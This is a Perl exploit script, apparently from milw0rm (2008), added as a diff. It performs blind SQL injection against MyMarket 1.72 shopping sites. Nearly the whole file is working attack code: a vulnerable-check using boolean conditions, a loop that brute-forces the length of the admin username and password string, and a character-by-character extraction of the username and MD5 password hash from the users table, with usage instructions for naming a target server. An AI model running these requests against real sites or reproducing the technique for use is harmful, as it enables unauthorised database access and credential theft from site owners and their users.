@@ -1,0 +1,149 @@
+#!/usr/bin/perl
+######################
+#
+#MyMarket 1.72 Blind SQL Injection Exploit
+#
+######################
+#
+#Bug by: h0yt3r
+#
+#Demo: http://mymarket.sourceforge.net/demo/shopping/
+#
+##
+###
+##
+#
+#http://www.site.de/mymarket/shopping/?id=bluah
+#Ok when we give $id an unexpected value like this we get an SQL Error.
+#Union selecting seems not possible...
+#Exploit needs a valid category id.
+#The Password is in md5 so exploiting will take an awful lot of time.
+#You will have to change the content on some sites if there are no categorys.
+#So I couldnt make it to write a stable expl for all sites using this.
+#
+#SQL Injection:
+#http://[target]/[path]/?id=[SQL]
+#
+#######################
+#
+#Greetz to b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the foreverliving h4ck-y0u Team!
+#
+#######################
+#######################
+use LWP::UserAgent;
+my $userAgent = LWP::UserAgent->new;
+
+usage();
+
+$server = $ARGV[0];
+$dir = $ARGV[1];
+$id = $ARGV[2];
+
+
+print"\n";
+if (!$id) { die "Read Usage!\n"; }
+
+
+$filename ="index.php";
+
+my $vulnCheck = "http://".$server.$dir.$filename;
+
+my $goodSite = $vulnCheck."?id=".$id." and 1=1";
+my $badSite = $vulnCheck."?id=".$id." and 1=0";
+
+print"[x]Connecting:";
+my $Attack1= $userAgent->get($goodSite);
+my $Attack2= $userAgent->get($badSite);
+
+if($Attack1->is_success)
+{
+    print " Connected \n";
+    print "[x]Vulnerable Check: ";
+    ###Will change some times
+    if($Attack1->content !~ m/None /i  && $Attack2->content =~ m/None/i)
+        { print "Vulnerable \n"; }
+    else
+        { print "Not Vulnerable"; exit;}
+}
+
+else
+{
+    print " Connection Failed";
+    exit;
+}
+
+my $asciiNUM="";
+my $length;
+
+print "[x]Bruteforcing Length...(if this freezes you have to change the content)\n";
+
+my $lengthCounter = 1;
+while(1)
+{
+    my $url = "".$vulnCheck."?id=".$id."%20and%20LENGTH((select%20concat(username,0x3a,password)%20from%20users%20limit%200,1))=".$lengthCounter."";
+    my $Attack= $userAgent->get($url);
+    my $content = $Attack->content;
+    if($content =~ m/None/i)
+        { $lengthCounter++; }
+    else
+        { $length=$length.$lengthCounter; last; }
+}
+
+my @Daten = ("61","62","63","64","65","66","67","68","69","6A","6B","6C","6D","6E","6F","70","71","72","73","74","75","76","77","78","79","7A","3A","5F","31","32","33","34","35","36","37","38","39","30","21","23","2B","28","29","40","2D","F5","25","26","2F","3F");
+
+print "[x]Injecting Black Magic...will take SOME time...\n";
+for($b=1;$b<=$length;$b++)
+{
+    for(my $u=0;$u<53;$u++)
+    {            
+        my $url = "".$vulnCheck."?id=".$id."%20and%20substring((select%20concat(username,0x3a,password)%20from%20users%20limit%200,1),".$b.",1)=0x".$Daten[$u]."";
+
+        my $Attack= $userAgent->get($url);
+
+        my $content = $Attack->content;        
+
+        if($content !~ m/None/i)   
+        {            
+            print "[x]Found Char ".$Daten[$u]."\n";            
+            $hex=$hex.$Daten[$u];
+            last;        
+        }
+        
+    
+    }
+}
+
+print "[x]Converting \n";
+my $a_str = hex_to_ascii($hex);
+
+@login = split(/\:/, $a_str);
+
+print "[x]Success! \n";
+print "     Username: $login[0]\n";
+print "     Password: $login[1]";
+    
+sub hex_to_ascii ($)
+{        
+        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
+        return $str;
+}
+
+
+
+
+sub usage()
+{
+    print q
+    {
+    ######################################################
+             MyMarket Remote Blind SQL Injection Exploit    
+                         -Written by h0yt3r-             
+    Usage: MyMarket.pl [Server] [Path] [Category ID]
+    Sample:
+    perl MyMarket.pl www.site.com /shopping/ 1
+    ######################################################
+    };
+
+} 
+
+# milw0rm.com [2008-06-16]
